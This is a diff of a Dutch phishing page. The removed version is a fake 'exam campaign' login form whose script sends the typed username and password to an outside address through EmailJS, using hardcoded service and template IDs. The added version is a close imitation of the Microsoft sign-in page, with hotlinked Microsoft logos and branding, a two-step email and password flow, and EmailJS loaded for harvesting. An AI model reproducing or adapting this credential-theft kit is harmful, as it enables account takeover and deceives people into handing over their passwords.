@@ -1,120 +1,59 @@
 <!DOCTYPE html>
-<html lang="nl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Examencommissie Winactie</title>
-    <style>
-        /* Algemeen opmaak van de pagina */
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #0078D4, #00B0FF);
-        }
+<html>
+    <head>
+        <link rel="stylesheet" href="style.css">
+        <title>Aanmelden bij uw account</title>
+        <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    </head>
+    <body>
+        <img src="Achtergrond.svg" class="bg" id="bg">
+        <main>
+            <div id="center" class="lightbox">
+                <div id="lightbox">
+                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="logo">
+                    <div class="title">Aanmelden</div>
+                    <div id="note" style="display: none;">Voer een geldig e-mailadres, telefoonnummer of Skype-naam in.</div>
+                    <input type="email" class="email" id="email" autocomplete="off" placeholder="E-mailadres, telefoonnummer of Skype-naam">
+                    <div class="new-account">Geen account? <a href="https://signup.live.com/signup?">Maak nu een account</a></div>
+                    <div class="no-access"><a href="https://login.microsoftonline.com/">Hebt u geen toegang tot het account?</a></div>
+                    <input type="button" value="Volgende" id="submit" class="submit">
+                </div>
 
-        .login-container {
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-
-        h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
-        }
-
-        /* Stijl voor invoervelden */
-        input {
-            width: 85%;
-            padding: 12px;
-            margin: 12px 0;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 16px;
-        }
-
-        /* Stijl voor de inlogknop */
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #0078D4;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        /* Hover-effect voor de knop */
-        button:hover {
-            background-color: #005ea6;
-        }
-
-        /* Stijl voor foutmeldingen */
-        p#message {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-
-        /* Media query voor mobiele weergave */
-        @media screen and (max-width: 600px) {
-            .login-container {
-                padding: 30px;
-                margin: 10px;
-            }
-            h2 {
-                font-size: 20px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <h2>Inloggen voor Examenactie</h2>
-        <form onsubmit="return login()">
-            <input type="text" id="username" placeholder="Gebruikersnaam" required>
-            <input type="password" id="password" placeholder="Wachtwoord" required>
-            <button type="submit">Inloggen</button>
-        </form>
-        <p id="message"></p>
-    </div>
-
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script>
-        emailjs.init("cXBQtkCZQdlbhKdfG");
-
-        function login() {
-            // Haal de gebruikersnaam en wachtwoord op uit de inputvelden
-            let user = document.getElementById("username").value;
-            let pass = document.getElementById("password").value;
-
-            // Maak de template parameters aan voor de e-mail
-            const templateParams = {
-                mail: user, // Gebruikersnaam als mail
-                wachtwoord: pass // Wachtwoord
-            };
-
-            emailjs.send("service_9q2qoob", "template_jpgwf8d", templateParams)
-                .then(function(response) {
-                    window.location.href = "homepage.html";
-                }, function(error) {
-                    console.log('Fout bij verzenden e-mail:', error);
-                    document.getElementById("message").innerText = "Er is een fout opgetreden bij het inloggen.";
-                });
-
-            return false;
-        }
-    </script>
-</body>
+                <div id="passwordPage" class="hidden">
+                    <div class="logoBanner">
+                        <img src="https://aadcdn.msauthimages.net/c1c6b6c8-50aoayfc7clfkoxxs2uutogapybqllwpd9cpe-t2tou/logintenantbranding/0/bannerlogo?ts=636464384620697590" class="bannerLogo">
+                    </div>
+                    <div class="content">
+                        <div class="mail">
+                            <button class="arrow" id="arrow" type="button">
+                                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" class="arrow-button">
+                            </button>
+                            <div class="emailDisplay" id="emailDisplay"></div>
+                        </div>
+                        <div class="loginHeader">
+                            <div class="passwordHeader">Wachtwoord invoeren</div>
+                        </div>
+                        <div class="password">
+                            <input type="password" class="passwordInpt" id="passwordInpt" placeholder="Wachtwoord">
+                            <a href="https://passwordreset.microsoftonline.com/" class="forgotPassword"><div>Wachtwoord vergeten</div></a>
+                        </div>
+                        <input type="submit" value="Aanmelden" id="signIn" class="submit">
+                    </div>
+                </div>
+            </div>
+            <a href="https://login.microsoftonline.com/" id="options"><div class="options">
+                <div class="options-row">
+                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" class="key">
+                    <div class="option-box"><div class="option">Aanmeldingsopties</div></div>
+                </div>
+            </div></a>
+        </main>
+        <footer class="footer">
+            <a href="https://www.microsoft.com/nl-NL/servicesagreement/" class="terms" id="terms" style="color: #000;">Gebruiksvoorwaarden</a>
+            <a href="https://www.microsoft.com/nl-NL/privacy/privacystatement" class="privacy" id="privacy" style="color: #000;">Privacy en cookies</a>
+            <a href="#" class="moreOptions" style="color: #000;" id="dots">...</a>
+        </footer>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+        <script src="script.js"></script>
+    </body>
 </html>
